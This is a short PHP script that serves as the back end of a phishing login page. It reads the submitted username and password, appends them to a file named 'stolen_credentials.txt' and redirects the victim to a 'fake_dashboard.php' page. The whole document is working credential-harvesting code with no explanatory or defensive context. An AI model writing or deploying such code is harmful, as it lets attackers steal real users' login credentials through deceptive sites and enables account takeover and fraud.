

<?php
  $username = $_POST['username'];
  $password = $_POST['password'];
  $fp = fopen('stolen_credentials.txt', 'a');
  fwrite($fp, $username . ':' . $password . "\n");
  fclose($fp);

  header('Location: fake_dashboard.php');
  exit;
?>
